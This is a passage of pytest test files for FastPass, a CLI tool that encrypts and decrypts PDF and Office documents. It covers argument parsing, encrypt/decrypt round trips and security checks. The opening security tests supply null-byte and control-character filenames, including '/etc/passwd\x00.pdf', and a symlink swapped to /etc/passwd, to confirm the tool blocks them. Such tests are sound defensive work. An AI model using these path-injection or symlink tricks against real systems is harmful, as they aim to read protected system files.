    def test_null_byte_injection_attack(self, fastpass_executable, project_root):
        """Test: Null byte injection attacks are blocked"""
        null_byte_inputs = [
            "file\x00.pdf",
            "file.pdf\x00.txt",
            "/etc/passwd\x00.pdf"
        ]
        
        for input_path in null_byte_inputs:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", input_path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, f"Null byte injection not blocked: {repr(input_path)}"
    
    @pytest.mark.security
    def test_control_character_injection_attack(self, fastpass_executable, project_root):
        """Test: Control character injection attacks are blocked"""
        control_char_inputs = [
            "file\x01.pdf",
            "file\x02.pdf", 
            "file\x1f.pdf",
            "file\x7f.pdf"
        ]
        
        for input_path in control_char_inputs:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", input_path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, f"Control character injection not blocked: {repr(input_path)}"


class TestRaceConditionAttacks:
    """Test race condition attack prevention"""
    
    @pytest.mark.security
    def test_temp_file_race_condition(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Temporary file operations are atomic and secure"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Run multiple FastPass operations concurrently to test for race conditions
        # This is a basic test - more sophisticated race condition testing would require
        # specialized tools and techniques
        
        results = []
        
        # Start multiple operations
        for i in range(3):
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(sample_pdf_file), "-p", f"password_{i}"],
                cwd=project_root
            )
            results.append(result)
        
        # All operations should complete without interference
        # At least one should succeed (the last one, due to overwriting)
        success_count = sum(1 for r in results if r.returncode == 0)
        assert success_count >= 1, "No operations succeeded - possible race condition"
    
    @pytest.mark.security
    def test_symlink_swap_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Symlink swap attacks during processing are prevented"""
        # Create a legitimate file
        legit_file = temp_work_dir / "legitimate.pdf"
        legit_file.write_text("legitimate content")
        
        # This test simulates an attack where an attacker replaces a file
        # with a symlink during processing. The security validator should
        # detect symlinks and block the operation.
        
        try:
            # Create symlink with same name (simulating swap)
            legit_file.unlink()
            legit_file.symlink_to("/etc/passwd")
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(legit_file), "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, "Symlink swap attack not detected"
            
        except OSError:
            pytest.skip("Symlinks not supported on this system")
</file>

<file path="tests/test_cli_basic.py">
"""
Basic CLI Tests for FastPass
Test core CLI functionality and argument parsing
Maps to: test_cli_parsing.py from test design
"""

import subprocess
import pytest
from pathlib import Path
import os

class TestCLIBasicFunctionality:
    """Test basic CLI operations and help functions"""
    
    def test_help_display(self, fastpass_executable):
        """Test: -h and --help show usage information"""
        # A1h_Help: Show Help Information
        result = subprocess.run(
            fastpass_executable + ["--help"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 0
        assert "FastPass" in result.stdout
        assert "encrypt" in result.stdout
        assert "decrypt" in result.stdout
        assert "check-password" in result.stdout
    
    def test_version_display(self, fastpass_executable):
        """Test: --version shows version information"""
        result = subprocess.run(
            fastpass_executable + ["--version"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 0
        assert "FastPass" in result.stdout
        assert "1.0.0" in result.stdout
    
    def test_list_supported_formats(self, fastpass_executable):
        """Test: --list-supported shows format list and exits"""
        # A1i_List: Show Supported File Types
        result = subprocess.run(
            fastpass_executable + ["--list-supported"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 0
        assert "FastPass Supported File Formats" in result.stdout
        assert ".pdf" in result.stdout
        assert ".docx" in result.stdout
        assert "Modern Office Documents" in result.stdout
        assert "PDF Documents" in result.stdout
        assert "Legacy Office Formats" in result.stdout
    
    def test_no_operation_error(self, fastpass_executable):
        """Test: Missing operation should trigger error"""
        result = subprocess.run(
            fastpass_executable + ["-i", "test.pdf", "-p", "password"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Must specify an operation" in result.stderr
    
    def test_no_input_files_error(self, fastpass_executable):
        """Test: Missing -i flag should trigger error"""
        # A2a_Error: Nothing to Process
        result = subprocess.run(
            fastpass_executable + ["encrypt", "-p", "password"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Must specify either files" in result.stderr
    
    def test_no_password_error(self, fastpass_executable):
        """Test: Missing -p should trigger error for encrypt/decrypt"""
        result = subprocess.run(
            fastpass_executable + ["encrypt", "-i", "test.pdf"], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Must specify passwords" in result.stderr

class TestCLIArgumentValidation:
    """Test CLI argument validation logic"""
    
    def test_conflicting_input_methods(self, fastpass_executable, temp_work_dir):
        """Test: Conflicting input methods should error"""
        # A2a_Both_Error: Conflicting Instructions
        result = subprocess.run(
            fastpass_executable + [
                "decrypt", 
                "-i", "test.pdf", 
                "-r", str(temp_work_dir),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Cannot specify both individual files and recursive directory" in result.stderr
    
    def test_recursive_encrypt_blocked(self, fastpass_executable, temp_work_dir):
        """Test: Recursive mode with encrypt should be blocked"""
        # A2a1_Error: Recursive Encryption Blocked
        result = subprocess.run(
            fastpass_executable + [
                "encrypt", 
                "-r", str(temp_work_dir),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 2
        assert "Recursive mode only supported for decrypt operations" in result.stderr
    
    def test_recursive_decrypt_allowed(self, fastpass_executable, temp_work_dir):
        """Test: Recursive mode with decrypt should be allowed"""
        result = subprocess.run(
            fastpass_executable + [
                "decrypt", 
                "-r", str(temp_work_dir),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should not error on argument validation
        # May error later on file processing, but that's expected
        assert "Recursive mode only supported for decrypt operations" not in result.stderr

class TestCLIPasswordHandling:
    """Test password argument handling"""
    
    def test_single_password_cli(self, fastpass_executable, simple_test_pdf):
        """Test: -p password123"""
        result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(simple_test_pdf),
                "-p", "testpassword"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should accept the password argument without validation errors
        assert "Must specify passwords" not in result.stderr
    
    def test_multiple_passwords_cli(self, fastpass_executable, simple_test_pdf):
        """Test: -p password1 password2 "complex pass" """
        result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(simple_test_pdf),
                "-p", "password1", "password2", "complex pass"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should accept multiple passwords without validation errors
        assert "Must specify passwords" not in result.stderr
    
    def test_password_list_file(self, fastpass_executable, simple_test_pdf, password_list_file):
        """Test: --password-list passwords.txt"""
        result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(simple_test_pdf),
                "--password-list", str(password_list_file)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should accept password list file without validation errors
        assert "Must specify passwords" not in result.stderr

class TestFileFormatValidation:
    """Test file format validation"""
    
    def test_unsupported_file_format(self, fastpass_executable, temp_work_dir):
        """Test: Unsupported formats (.txt, .zip) should be rejected"""
        # Create a test txt file
        test_txt = temp_work_dir / "test.txt"
        test_txt.write_text("Test content")
        
        result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_txt),
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 1
        assert "Unsupported file format" in result.stderr
        assert ".txt" in result.stderr
    
    def test_nonexistent_file(self, fastpass_executable):
        """Test: Non-existent files should be handled gracefully"""
        result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", "nonexistent_file.pdf",
                "-p", "password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert result.returncode == 1
        # Should report file not found error
</file>

<file path="tests/test_integration_basic.py">
"""
Basic Integration Tests for FastPass
Test end-to-end functionality with real files
Maps to: test_encrypt_operations.py and test_decrypt_operations.py from test design
"""

import subprocess
import pytest
from pathlib import Path
import shutil

class TestPDFOperations:
    """Test real PDF encryption and decryption operations"""
    
    def test_pdf_encrypt_decrypt_cycle(self, fastpass_executable, temp_work_dir):
        """Test: Complete encrypt→decrypt cycle preserves content"""
        
        # Use existing test PDF
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        # Copy to temp directory for testing
        test_pdf = temp_work_dir / "test_cycle.pdf"
        shutil.copy2(source_pdf, test_pdf)
        
        # Get original file size for comparison
        original_size = test_pdf.stat().st_size
        
        # Step 1: Encrypt the PDF
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "test_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0, f"Encryption failed: {encrypt_result.stderr}"
        assert "Successfully encrypted" in encrypt_result.stdout
        
        # Verify file still exists and size changed
        assert test_pdf.exists()
        encrypted_size = test_pdf.stat().st_size
        # Encrypted file should be different size (usually larger)
        
        # Step 2: Verify file is now encrypted (check-password should succeed)
        check_result = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(test_pdf),
                "-p", "test_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert check_result.returncode == 0, f"Password check failed: {check_result.stderr}"
        
        # Step 3: Decrypt the PDF
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i", str(test_pdf),
                "-p", "test_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert decrypt_result.returncode == 0, f"Decryption failed: {decrypt_result.stderr}"
        assert "Successfully decrypted" in decrypt_result.stdout
        
        # Verify file still exists and is accessible
        assert test_pdf.exists()
        final_size = test_pdf.stat().st_size
        
        # File should be accessible without password now
        check_no_password = subprocess.run(
            fastpass_executable + [
                "check-password",
                "-i", str(test_pdf)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should complete successfully (no password needed for unencrypted file)
        assert check_no_password.returncode == 0
    
    def test_pdf_wrong_password_fails(self, fastpass_executable, temp_work_dir):
        """Test: Wrong password should fail gracefully"""
        
        # Use existing test PDF
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        # Copy to temp directory
        test_pdf = temp_work_dir / "test_wrong_password.pdf"
        shutil.copy2(source_pdf, test_pdf)
        
        # Encrypt with one password
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "correct_password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        
        # Try to decrypt with wrong password
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i", str(test_pdf),
                "-p", "wrong_password"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        # Should fail with password error
        assert decrypt_result.returncode != 0
        # Should contain password-related error message
    
    def test_multiple_files_same_password(self, fastpass_executable, temp_work_dir):
        """Test: Multiple files with same password"""
        
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        # Create multiple test files
        test_files = []
        for i in range(3):
            test_file = temp_work_dir / f"test_multi_{i}.pdf"
            shutil.copy2(source_pdf, test_file)
            test_files.append(test_file)
        
        # Encrypt all files with same password
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i"] + [str(f) for f in test_files] + [
                "-p", "shared_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        assert "Total files processed: 3" in encrypt_result.stdout
        assert "Successful: 3" in encrypt_result.stdout
        assert "Failed: 0" in encrypt_result.stdout
        
        # Decrypt all files with same password
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i"] + [str(f) for f in test_files] + [
                "-p", "shared_password_123"
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert decrypt_result.returncode == 0
        assert "Total files processed: 3" in decrypt_result.stdout
        assert "Successful: 3" in decrypt_result.stdout

class TestPasswordListFunctionality:
    """Test password list file functionality"""
    
    def test_password_list_file_usage(self, fastpass_executable, temp_work_dir, password_list_file):
        """Test: Password list file works correctly"""
        
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        test_pdf = temp_work_dir / "test_password_list.pdf"
        shutil.copy2(source_pdf, test_pdf)
        
        # Encrypt with first password from our list
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "password123"  # This should be first in password_list_file
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        
        # Try to decrypt using password list (should find the correct password)
        decrypt_result = subprocess.run(
            fastpass_executable + [
                "decrypt",
                "-i", str(test_pdf),
                "--password-list", str(password_list_file)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert decrypt_result.returncode == 0
        assert "Successfully decrypted" in decrypt_result.stdout

class TestOutputDirectory:
    """Test output directory functionality"""
    
    def test_output_directory_creation(self, fastpass_executable, temp_work_dir):
        """Test: Output directory is created and files are placed correctly"""
        
        source_pdf = Path(__file__).parent.parent / "dev" / "pdf" / "test1_docx.pdf"
        if not source_pdf.exists():
            pytest.skip("Test PDF not available")
        
        test_pdf = temp_work_dir / "input" / "test_output.pdf"
        test_pdf.parent.mkdir(exist_ok=True)
        shutil.copy2(source_pdf, test_pdf)
        
        output_dir = temp_work_dir / "output"
        
        # Encrypt with output directory
        encrypt_result = subprocess.run(
            fastpass_executable + [
                "encrypt",
                "-i", str(test_pdf),
                "-p", "output_test_password",
                "-o", str(output_dir)
            ], 
            capture_output=True, 
            text=True,
            cwd=Path(__file__).parent.parent
        )
        
        assert encrypt_result.returncode == 0
        
        # Verify output directory was created
        assert output_dir.exists()
        assert output_dir.is_dir()
        
        # Verify file was created in output directory
        output_file = output_dir / test_pdf.name
        assert output_file.exists()
        
        # Original file should still exist
        assert test_pdf.exists()
</file>

<file path="tests/unit/__init__.py">
# Unit tests package
</file>

<file path="tests/unit/test_cli_parsing.py">
"""
Comprehensive Unit Tests for CLI Argument Parsing
Tests every CLI argument combination and validation scenario
"""

import pytest
import argparse
import sys
from unittest.mock import patch, MagicMock
from pathlib import Path
from io import StringIO

# Import modules under test
import src.cli as cli_module
from src.utils.config import FastPassConfig


class TestCLIArgumentParsing:
    """Test CLI argument parsing and validation logic"""
    
    def test_parse_encrypt_basic(self):
        """Test: Basic encrypt operation parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password']):
            args = cli_module.parse_command_line_arguments()
            assert args.operation == 'encrypt'
            assert args.input == [Path('test.pdf')]
            assert args.password == ['password']
    
    def test_parse_decrypt_basic(self):
        """Test: Basic decrypt operation parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'decrypt', '-i', 'test.pdf', '-p', 'password']):
            args = cli_module.parse_command_line_arguments()
            assert args.operation == 'decrypt'
            assert args.input == [Path('test.pdf')]
            assert args.password == ['password']
    
    def test_parse_check_password_basic(self):
        """Test: Basic check-password operation parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'check-password', '-i', 'test.pdf']):
            args = cli_module.parse_command_line_arguments()
            assert args.operation == 'check-password'
            assert args.input == [Path('test.pdf')]
    
    def test_parse_multiple_files(self):
        """Test: Multiple files parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'file1.pdf', 'file2.docx', 'file3.xlsx', '-p', 'password']):
            args = cli_module.parse_command_line_arguments()
            assert args.input == [Path('file1.pdf'), Path('file2.docx'), Path('file3.xlsx')]
    
    def test_parse_files_with_spaces(self):
        """Test: Files with spaces in names"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'file with spaces.pdf', '-p', 'password']):
            args = cli_module.parse_command_line_arguments()
            assert args.input == [Path('file with spaces.pdf')]
    
    def test_parse_multiple_passwords(self):
        """Test: Multiple passwords parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'pass1', 'pass2', 'pass3']):
            args = cli_module.parse_command_line_arguments()
            assert args.password == ['pass1', 'pass2', 'pass3']
    
    def test_parse_passwords_with_spaces(self):
        """Test: Passwords with spaces"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password with spaces', 'another password']):
            args = cli_module.parse_command_line_arguments()
            assert args.password == ['password with spaces', 'another password']
    
    def test_parse_password_list_file(self):
        """Test: Password list file parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'decrypt', '-i', 'test.pdf', '--password-list', 'passwords.txt']):
            args = cli_module.parse_command_line_arguments()
            assert args.password_list == Path('passwords.txt')
    
    def test_parse_recursive_mode(self):
        """Test: Recursive mode parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'decrypt', '-r', '/path/to/dir', '-p', 'password']):
            args = cli_module.parse_command_line_arguments()
            assert args.recursive == Path('/path/to/dir')
    
    def test_parse_output_directory(self):
        """Test: Output directory parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password', '-o', '/output/dir']):
            args = cli_module.parse_command_line_arguments()
            assert args.output_dir == Path('/output/dir')
    
    def test_parse_dry_run_flag(self):
        """Test: Dry run flag parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password', '--dry-run']):
            args = cli_module.parse_command_line_arguments()
            assert args.dry_run is True
    
    def test_parse_verify_flag(self):
        """Test: Verify flag parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password', '--verify']):
            args = cli_module.parse_command_line_arguments()
            assert args.verify is True
    
    def test_parse_debug_flag(self):
        """Test: Debug flag parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password', '--debug']):
            args = cli_module.parse_command_line_arguments()
            assert args.debug is True
    
    def test_parse_log_file(self):
        """Test: Log file parsing"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password', '--log-file', 'app.log']):
            args = cli_module.parse_command_line_arguments()
            assert args.log_file == Path('app.log')
    
    def test_parse_combined_flags(self):
        """Test: Multiple flags combined"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password', '--dry-run', '--verify', '--debug']):
            args = cli_module.parse_command_line_arguments()
            assert args.dry_run is True
            assert args.verify is True
            assert args.debug is True
    
    def test_parse_list_supported(self):
        """Test: List supported formats flag"""
        with patch.object(sys, 'argv', ['fast_pass', '--list-supported']):
            args = cli_module.parse_command_line_arguments()
            assert args.list_supported is True


class TestCLIArgumentValidation:
    """Test CLI argument validation logic"""
    
    def test_validate_encrypt_basic_valid(self):
        """Test: Valid encrypt arguments pass validation"""
        args = argparse.Namespace(
            operation='encrypt',
            input=[Path('test.pdf')],
            password=['password'],
            recursive=None,
            password_list=None,
            list_supported=False
        )
        # Should not raise exception
        cli_module.validate_arguments(args)
    
    def test_validate_decrypt_basic_valid(self):
        """Test: Valid decrypt arguments pass validation"""
        args = argparse.Namespace(
            operation='decrypt',
            input=[Path('test.pdf')],
            password=['password'],
            recursive=None,
            password_list=None,
            list_supported=False
        )
        # Should not raise exception
        cli_module.validate_arguments(args)
    
    def test_validate_check_password_no_password_valid(self):
        """Test: check-password without password is valid"""
        args = argparse.Namespace(
            operation='check-password',
            input=[Path('test.pdf')],
            password=None,
            recursive=None,
            password_list=None,
            list_supported=False
        )
        # Should not raise exception
        cli_module.validate_arguments(args)
    
    def test_validate_no_operation_error(self):
        """Test: Missing operation raises error"""
        args = argparse.Namespace(
            operation=None,
            input=[Path('test.pdf')],
            password=['password'],
            recursive=None,
            password_list=None,
            list_supported=False
        )
        with pytest.raises(ValueError, match="Must specify an operation"):
            cli_module.validate_arguments(args)
    
    def test_validate_no_input_files_error(self):
        """Test: Missing input files raises error"""
        args = argparse.Namespace(
            operation='encrypt',
            input=None,
            password=['password'],
            recursive=None,
            password_list=None,
            list_supported=False
        )
        with pytest.raises(ValueError, match="Must specify either files"):
            cli_module.validate_arguments(args)
    
    def test_validate_no_password_encrypt_error(self):
        """Test: Missing password for encrypt raises error"""
        args = argparse.Namespace(
            operation='encrypt',
            input=[Path('test.pdf')],
            password=None,
            recursive=None,
            password_list=None,
            list_supported=False
        )
        with pytest.raises(ValueError, match="Must specify passwords"):
            cli_module.validate_arguments(args)
    
    def test_validate_no_password_decrypt_error(self):
        """Test: Missing password for decrypt raises error"""
        args = argparse.Namespace(
            operation='decrypt',
            input=[Path('test.pdf')],
            password=None,
            recursive=None,
            password_list=None,
            list_supported=False
        )
        with pytest.raises(ValueError, match="Must specify passwords"):
            cli_module.validate_arguments(args)
    
    def test_validate_conflicting_input_methods_error(self):
        """Test: Both files and recursive raises error"""
        args = argparse.Namespace(
            operation='decrypt',
            input=[Path('test.pdf')],
            password=['password'],
            recursive=Path('/some/dir'),
            password_list=None,
            list_supported=False
        )
        with pytest.raises(ValueError, match="Cannot specify both individual files and recursive"):
            cli_module.validate_arguments(args)
    
    def test_validate_recursive_encrypt_blocked(self):
        """Test: Recursive mode with encrypt is blocked"""
        args = argparse.Namespace(
            operation='encrypt',
            input=None,
            password=['password'],
            recursive=Path('/some/dir'),
            password_list=None,
            list_supported=False
        )
        with pytest.raises(ValueError, match="Recursive mode only supported for decrypt"):
            cli_module.validate_arguments(args)
    
    def test_validate_recursive_decrypt_allowed(self):
        """Test: Recursive mode with decrypt is allowed"""
        args = argparse.Namespace(
            operation='decrypt',
            input=None,
            password=['password'],
            recursive=Path('/some/dir'),
            password_list=None,
            list_supported=False
        )
        # Should not raise exception
        cli_module.validate_arguments(args)
    
    def test_validate_recursive_check_password_allowed(self):
        """Test: Recursive mode with check-password is allowed"""
        args = argparse.Namespace(
            operation='check-password',
            input=None,
            password=None,
            recursive=Path('/some/dir'),
            password_list=None,
            list_supported=False
        )
        # Should not raise exception
        cli_module.validate_arguments(args)
    
    def test_validate_list_supported_skips_validation(self):
        """Test: --list-supported skips other validation"""
        args = argparse.Namespace(
            operation=None,
            input=None,
            password=None,
            recursive=None,
            password_list=None,
            list_supported=True
        )
        # Should not raise exception
        cli_module.validate_arguments(args)


class TestCLIPasswordHandling:
    """Test CLI password input handling"""
    
    def test_handle_stdin_passwords_no_stdin(self):
        """Test: No stdin password handling"""
        args = argparse.Namespace(password=['regular_password'])
        cli_module.handle_stdin_passwords(args)
        assert args.password == ['regular_password']
        assert not hasattr(args, 'stdin_password_mapping')
    
    def test_handle_stdin_passwords_valid_json(self):
        """Test: Valid JSON stdin password handling"""
        args = argparse.Namespace(password=['stdin', 'regular_password'])
        json_input = '{"file1.pdf": "password1", "file2.docx": "password2"}'
        
        with patch('sys.stdin.read', return_value=json_input):
            cli_module.handle_stdin_passwords(args)
            
        assert args.password == ['regular_password']
        assert hasattr(args, 'stdin_password_mapping')
        assert args.stdin_password_mapping == {"file1.pdf": "password1", "file2.docx": "password2"}
    
    def test_handle_stdin_passwords_invalid_json(self):
        """Test: Invalid JSON stdin password handling"""
        args = argparse.Namespace(password=['stdin'])
        json_input = '{"invalid": json}'
        
        with patch('sys.stdin.read', return_value=json_input):
            with pytest.raises(ValueError, match="Invalid JSON in stdin"):
                cli_module.handle_stdin_passwords(args)
    
    def test_handle_stdin_passwords_empty_stdin(self):
        """Test: Empty stdin password handling"""
        args = argparse.Namespace(password=['stdin'])
        
        with patch('sys.stdin.read', return_value=''):
            cli_module.handle_stdin_passwords(args)
            
        assert args.password == []
        assert not hasattr(args, 'stdin_password_mapping')


class TestCLIInformationDisplay:
    """Test CLI information display functions"""
    
    def test_display_supported_formats(self, capsys):
        """Test: Display supported formats output"""
        args = argparse.Namespace(list_supported=True)
        result = cli_module.display_information_and_exit(args)
        
        captured = capsys.readouterr()
        assert "FastPass Supported File Formats:" in captured.out
        assert ".pdf" in captured.out
        assert ".docx" in captured.out
        assert ".xlsx" in captured.out
        assert ".pptx" in captured.out
        assert result == 0
    
    def test_display_no_information_request(self):
        """Test: No information request returns 0"""
        args = argparse.Namespace(list_supported=False)
        result = cli_module.display_information_and_exit(args)
        assert result == 0


class TestCLIMainFunction:
    """Test main CLI function and error handling"""
    
    def test_main_help_display(self, capsys):
        """Test: Help display works"""
        with patch.object(sys, 'argv', ['fast_pass', '--help']):
            with pytest.raises(SystemExit) as exc_info:
                cli_module.main()
            assert exc_info.value.code == 0
    
    def test_main_version_display(self, capsys):
        """Test: Version display works"""
        with patch.object(sys, 'argv', ['fast_pass', '--version']):
            with pytest.raises(SystemExit) as exc_info:
                cli_module.main()
            assert exc_info.value.code == 0
    
    def test_main_list_supported_formats(self, capsys):
        """Test: List supported formats works"""
        with patch.object(sys, 'argv', ['fast_pass', '--list-supported']):
            result = cli_module.main()
            assert result == 0
            
            captured = capsys.readouterr()
            assert "FastPass Supported File Formats:" in captured.out
    
    def test_main_invalid_arguments_error(self, capsys):
        """Test: Invalid arguments return error code 2"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt']):  # Missing required args
            result = cli_module.main()
            assert result == 2
            
            captured = capsys.readouterr()
            assert "Error:" in captured.err
    
    def test_main_keyboard_interrupt(self, capsys):
        """Test: Keyboard interrupt handling"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password']):
            with patch('src.cli.FastPassApplication') as mock_app:
                mock_app.return_value.run.side_effect = KeyboardInterrupt()
                
                result = cli_module.main()
                assert result == 1
                
                captured = capsys.readouterr()
                assert "Operation cancelled by user" in captured.err
    
    def test_main_unexpected_error(self, capsys):
        """Test: Unexpected error handling"""
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', 'test.pdf', '-p', 'password']):
            with patch('src.cli.FastPassApplication') as mock_app:
                mock_app.return_value.run.side_effect = RuntimeError("Unexpected error")
                
                result = cli_module.main()
                assert result == 2
                
                captured = capsys.readouterr()
                assert "Unexpected error:" in captured.err


class TestCLIEdgeCases:
    """Test CLI edge cases and special scenarios"""
    
    def test_empty_password_list(self):
        """Test: Empty password list handling"""
        with patch.object(sys, 'argv', ['fast_pass', 'decrypt', '-i', 'test.pdf', '-p']):
            with pytest.raises(SystemExit):  # argparse should catch this
                cli_module.parse_command_line_arguments()
    
    def test_very_long_arguments(self):
        """Test: Very long arguments handling"""
        long_filename = "a" * 1000 + ".pdf"
        long_password = "p" * 1000
        
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', long_filename, '-p', long_password]):
            args = cli_module.parse_command_line_arguments()
            assert str(args.input[0]) == long_filename
            assert args.password[0] == long_password
    
    def test_unicode_arguments(self):
        """Test: Unicode arguments handling"""
        unicode_filename = "тест_файл.pdf"
        unicode_password = "пароль123"
        
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', unicode_filename, '-p', unicode_password]):
            args = cli_module.parse_command_line_arguments()
            assert str(args.input[0]) == unicode_filename
            assert args.password[0] == unicode_password
    
    def test_special_characters_in_paths(self):
        """Test: Special characters in file paths"""
        special_filename = "file$with&special@chars!.pdf"
        
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', special_filename, '-p', 'password']):
            args = cli_module.parse_command_line_arguments()
            assert str(args.input[0]) == special_filename
    
    def test_relative_vs_absolute_paths(self):
        """Test: Relative vs absolute path handling"""
        relative_path = "relative/path/file.pdf"
        absolute_path = "/absolute/path/file.pdf"
        
        with patch.object(sys, 'argv', ['fast_pass', 'encrypt', '-i', relative_path, absolute_path, '-p', 'password']):
            args = cli_module.parse_command_line_arguments()
            assert str(args.input[0]) == relative_path
            assert str(args.input[1]) == absolute_path
            assert args.input[0].is_absolute() is False
            assert args.input[1].is_absolute() is True
</file>

<file path="tests/unit/test_security_validation.py">
"""
Comprehensive Unit Tests for Security Validation
Tests all security hardening features and attack prevention
"""

import pytest
import tempfile
import os
import stat
from pathlib import Path
from unittest.mock import patch, MagicMock
import logging

# Import modules under test
from src.core.security import SecurityValidator
from src.app import SecurityViolationError


class TestSecurityValidatorInitialization:
    """Test SecurityValidator initialization and setup"""
    
    def test_security_validator_init(self):
        """Test: SecurityValidator initializes correctly"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        assert validator.logger == logger
        assert hasattr(validator, 'allowed_directories')
        assert isinstance(validator.allowed_directories, set)
    
    def test_allowed_directories_includes_home(self):
        """Test: Allowed directories includes home directory"""
        logger = MagicMock()
        validator = SecurityValidator(logger)
        
        # Should include home directory
